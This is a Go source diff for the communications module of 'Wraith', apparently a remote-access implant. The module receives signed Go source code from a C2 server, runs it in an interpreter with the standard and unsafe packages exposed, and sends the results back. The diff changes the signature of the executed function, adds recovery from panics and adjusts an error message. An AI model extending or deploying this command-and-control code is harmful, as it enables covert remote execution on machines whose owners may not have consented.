@@ -31,11 +31,11 @@ const (
 	SHM_ERRORS = "w.errors"
 )
 
-// A CommsManager module implementation which utilises (optionally) encrypted JWT
-// as a base for its transfer protocol. This allows messages to be signed and
-// verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
-// particularly advanced features and is meant as a simple default which does a
-// good job in most usecases.
+// A comms module implementation which utilises signed Go source code messages
+// as a base for its commands. This allows great versatility while maintaining
+// security with verification on both sides. This module is meant as a simple
+// default which does a good job in most usecases.
+// The underlying protocol is [TCP / WS / ... ] > Pinecone > HTTP > CBOR Structs.
 type ModulePinecomms struct {
 	mutex sync.Mutex
 
@@ -99,13 +99,17 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 		"Wraith": reflect.ValueOf((*libwraith.Wraith)(nil)),
 	}
 
+	stdlib.Symbols["wmpd/wmpd"] = map[string]reflect.Value{
+		"ModulePinecomms": reflect.ValueOf((*ModulePinecomms)(nil)),
+	}
+
 	i.Use(stdlib.Symbols)
 	i.Use(unsafe.Symbols)
 
 	var (
 		response     any
 		result       reflect.Value
-		communicator func(*libwraith.Wraith) any
+		communicator func(*ModulePinecomms, *libwraith.Wraith) any
 		ok           bool
 	)
 
@@ -128,13 +132,21 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 		goto respond
 	}
 
-	communicator, ok = result.Interface().(func(*libwraith.Wraith) any)
+	communicator, ok = result.Interface().(func(*ModulePinecomms, *libwraith.Wraith) any)
 	if !ok {
 		response = fmt.Errorf("returned function was of incorrect type (%T)", result.Interface())
 		goto respond
 	}
 
-	response = communicator(w)
+	func() {
+		defer func() {
+			if err := recover(); err != nil {
+				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("command in request `%s` panicked: %e", packetData.TxId, err))
+			}
+		}()
+
+		response = communicator(m, w)
+	}()
 
 	//
 	// Respond to the packet.
@@ -151,7 +163,7 @@ respond:
 		// There is no point sending anything because the TxId is included
 		// in the responseData and without it, c2 won't know what the response
 		// is to.
-		w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response to %s failed: %e", packetData.TxId, err))
+		w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response to `%s` failed: %e", packetData.TxId, err))
 		return
 	}
 
